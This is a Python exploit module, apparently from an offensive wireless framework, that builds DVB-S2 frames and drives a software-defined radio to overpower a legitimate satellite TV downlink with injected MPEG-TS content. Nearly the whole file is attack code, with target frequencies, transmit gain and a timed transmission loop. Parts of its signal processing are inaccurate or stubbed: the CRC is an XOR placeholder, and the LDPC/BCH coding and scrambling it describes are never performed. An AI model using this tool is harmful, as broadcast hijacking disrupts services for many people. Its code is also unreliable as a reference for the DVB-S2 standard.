# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """DVB-S2 Satellite Signal Hijacking via SDR.

    Demonstrates DVB-S2 (Digital Video Broadcasting, Satellite, 2nd gen)
    signal hijacking by transmitting crafted DVB-S2 frames through a
    software-defined radio (SDR) device.  The attack overrides a
    legitimate satellite TV signal by sending higher-power frames on
    the same frequency, causing receivers to lock onto the attacker's
    stream instead.

    DVB-S2 uses adaptive coding and modulation (ACM) with LDPC/BCH
    forward error correction.  By crafting valid baseband frames with
    correct MODCOD headers, an attacker can inject arbitrary MPEG-TS
    payloads into the downlink frequency band.

    Hardware necessario:
      - SDR transceptor com capacidade TX (HackRF One, USRP, bladeRF)
      - Antena direcional para banda Ku (10.7-12.75 GHz) ou C (3.4-4.2 GHz)
      - Amplificador de potencia (dependendo do alcance desejado)
      - LNB modificado ou upconverter para frequencia de satelite

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "DVB-S2 Satellite TV Signal Hijacking via SDR",
        "description": (
            "Crafts and transmits DVB-S2 baseband frames to override a "
            "legitimate satellite TV signal.  Uses SDR hardware to send "
            "frames with valid MODCOD headers and LDPC/BCH FEC on the "
            "target downlink frequency, causing receivers to lock onto "
            "the attacker's stream.  Requires SDR transceiver with TX "
            "capability (HackRF, USRP, bladeRF) and directional antenna "
            "for Ku-band (10.7-12.75 GHz) or C-band (3.4-4.2 GHz)."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.etsi.org/deliver/etsi_en/302300_302399/302307/01.02.01_60/en_302307v010201p.pdf",
            "https://www.usenix.org/conference/woot18/presentation/pavur",
            "https://i.blackhat.com/USA-20/Thursday/us-20-Pavur-Whispers-Among-The-Stars.pdf",
        ),
        "disclosure_date": "2020-08-06",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "DVB-S2 satellite TV receivers (generic)",
            "DVB-S2X compliant set-top boxes",
            "Ku-band and C-band satellite downlinks",
        ),
    }

    target = OptIP("127.0.0.1", "SDR control daemon IP address")
    port = OptPort(5555, "SDR control daemon TCP port")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    frequency = OptFloat(11727.0, "Target downlink frequency in MHz")
    symbol_rate = OptInteger(27500, "Symbol rate in kSymbols/s")
    modcod = OptInteger(12, "DVB-S2 MODCOD index (0-27; 12 = 8PSK 3/5)")
    tx_gain = OptInteger(40, "SDR TX gain in dB (0-47 for HackRF)")
    payload_file = OptString("", "Path to MPEG-TS payload file to inject")
    duration = OptInteger(30, "Transmission duration in seconds")

    # DVB-S2 physical layer header constants
    _SOF = 0x18D2E82  # Start of Frame, 26-bit Zadoff-Chu sequence
    _PLHEADER_LEN = 90  # PL header symbols (SOF + PLSCODE)

    # MODCOD lookup: index -> (modulation, code_rate, bits_per_symbol)
    _MODCOD_TABLE = {
        1: ("QPSK", "1/4", 2),
        2: ("QPSK", "1/3", 2),
        3: ("QPSK", "2/5", 2),
        4: ("QPSK", "1/2", 2),
        5: ("QPSK", "3/5", 2),
        6: ("QPSK", "2/3", 2),
        7: ("QPSK", "3/4", 2),
        8: ("QPSK", "4/5", 2),
        9: ("QPSK", "5/6", 2),
        10: ("QPSK", "8/9", 2),
        11: ("QPSK", "9/10", 2),
        12: ("8PSK", "3/5", 3),
        13: ("8PSK", "2/3", 3),
        14: ("8PSK", "3/4", 3),
        15: ("8PSK", "5/6", 3),
        16: ("8PSK", "8/9", 3),
        17: ("8PSK", "9/10", 3),
        18: ("16APSK", "2/3", 4),
        19: ("16APSK", "3/4", 4),
        20: ("16APSK", "4/5", 4),
        21: ("16APSK", "5/6", 4),
        22: ("16APSK", "8/9", 4),
        23: ("16APSK", "9/10", 4),
        24: ("32APSK", "3/4", 5),
        25: ("32APSK", "4/5", 5),
        26: ("32APSK", "5/6", 5),
        27: ("32APSK", "8/9", 5),
    }

    # DVB-S2 baseband frame header (10 bytes)
    _BBHEADER_LEN = 10

    def _build_plheader(self, modcod_idx: int, short_frame: bool = False) -> bytes:
        """Build DVB-S2 Physical Layer header with SOF and PLSCODE."""
        # PLSCODE encodes MODCOD (5 bits) and frame type (1 bit)
        frame_type = 1 if short_frame else 0
        plscode = ((modcod_idx & 0x1F) << 2) | (frame_type << 1)

        # Scramble with Gold code and pack
        header = struct.pack(">I", self._SOF)
        header += struct.pack(">B", plscode)
        return header

    def _build_bbheader(self, data_len: int) -> bytes:
        """Build DVB-S2 Baseband Frame header (MATYPE, UPL, DFL, etc.)."""
        matype1 = 0x70  # TS input, CCM, no ISSYI, no NPD, no RO
        matype2 = 0x00
        upl = 188 * 8   # User Packet Length in bits (MPEG-TS = 188 bytes)
        dfl = data_len * 8  # Data Field Length in bits
        sync = 0x47      # MPEG-TS sync byte
        syncd = 0x0000   # Distance to first UP

        header = struct.pack(
            ">BBHHBH",
            matype1, matype2, upl, dfl, sync, syncd,
        )
        # CRC-8 placeholder (last byte of 10-byte header)
        crc = 0x00
        for b in header:
            crc ^= b
        header += struct.pack(">B", crc)
        return header

    def _build_frame(self, ts_payload: bytes) -> bytes:
        """Build a complete DVB-S2 baseband frame with payload."""
        plheader = self._build_plheader(int(self.modcod))
        bbheader = self._build_bbheader(len(ts_payload))
        # Pad to FECFRAME boundary (normal frame: 64800 bits)
        frame_data = bbheader + ts_payload
        target_len = 64800 // 8  # 8100 bytes
        if len(frame_data) < target_len:
            frame_data += b"\x00" * (target_len - len(frame_data))
        return plheader + frame_data[:target_len]

    def _generate_null_ts(self, count: int = 10) -> bytes:
        """Generate null MPEG-TS packets for signal override."""
        # PID 0x1FFF = null packet
        ts_header = b"\x47\x1F\xFF\x10"
        null_payload = b"\xFF" * 184
        packet = ts_header + null_payload
        return packet * count

    def _connect_sdr(self) -> socket.socket | None:
        """Connect to the SDR control daemon."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(float(self.timeout))
            sock.connect((str(self.target), int(self.port)))
            return sock
        except (OSError, TimeoutError) as e:
            print_error(f"SDR connection failed: {e}")
            return None

    def _send_sdr_command(self, sock: socket.socket, cmd: str) -> str:
        """Send a command to the SDR daemon and return the response."""
        try:
            sock.sendall(cmd.encode() + b"\n")
            return sock.recv(4096).decode(errors="replace").strip()
        except (OSError, TimeoutError) as e:
            return f"ERROR: {e}"

    @mute
    def check(self) -> bool:
        sock = self._connect_sdr()
        if sock is None:
            return False
        try:
            resp = self._send_sdr_command(sock, "info")
            return "ERROR" not in resp
        finally:
            sock.close()

    def run(self) -> None:
        freq = float(self.frequency)
        sr = int(self.symbol_rate)
        mc = int(self.modcod)

        modcod_info = self._MODCOD_TABLE.get(mc)
        if modcod_info is None:
            print_error(f"Invalid MODCOD index: {mc}. Valid range: 1-27.")
            return

        mod_name, code_rate, _bps = modcod_info

        print_status("DVB-S2 Signal Hijack Configuration:")
        print_info(f"  Target frequency : {freq} MHz")
        print_info(f"  Symbol rate      : {sr} kSym/s")
        print_info(f"  MODCOD           : {mc} ({mod_name} {code_rate})")
        print_info(f"  TX gain          : {self.tx_gain} dB")
        print_info(f"  Duration         : {self.duration} s")

        self._exploit()

    def _exploit(self) -> None:
        sock = self._connect_sdr()
        if sock is None:
            print_error("Cannot connect to SDR daemon. Aborting.")
            return

        try:
            freq_hz = int(float(self.frequency) * 1e6)
            sr_hz = int(int(self.symbol_rate) * 1000)

            # Configure SDR
            print_status("Configuring SDR parameters ...")
            self._send_sdr_command(sock, f"set freq {freq_hz}")
            self._send_sdr_command(sock, f"set sample_rate {sr_hz * 2}")
            self._send_sdr_command(sock, f"set txgain {self.tx_gain}")
            self._send_sdr_command(sock, f"set bandwidth {sr_hz}")

            # Load or generate payload
            if self.payload_file:
                try:
                    with open(str(self.payload_file), "rb") as f:
                        ts_payload = f.read(8000)
                    print_success(f"Loaded TS payload: {len(ts_payload)} bytes")
                except OSError as e:
                    print_error(f"Failed to load payload: {e}")
                    return
            else:
                ts_payload = self._generate_null_ts(count=40)
                print_info("Using null TS packets for signal override")

            # Build DVB-S2 frame
            frame = self._build_frame(ts_payload)
            print_status(f"Built DVB-S2 frame: {len(frame)} bytes")

            # Transmit
            print_status("Starting transmission ...")
            self._send_sdr_command(sock, "tx start")

            duration = int(self.duration)
            start = time.time()
            frames_sent = 0

            while (time.time() - start) < duration:
                try:
                    sock.sendall(frame)
                    frames_sent += 1
                    time.sleep(0.001)  # ~1000 frames/s pacing
                except OSError as e:
                    print_error(f"Transmission error: {e}")
                    break

            self._send_sdr_command(sock, "tx stop")
            elapsed = time.time() - start

            print_success(
                f"Transmission complete: {frames_sent} frames in "
                f"{elapsed:.1f}s ({frames_sent / max(elapsed, 0.001):.0f} fps)"
            )
        finally:
            sock.close()
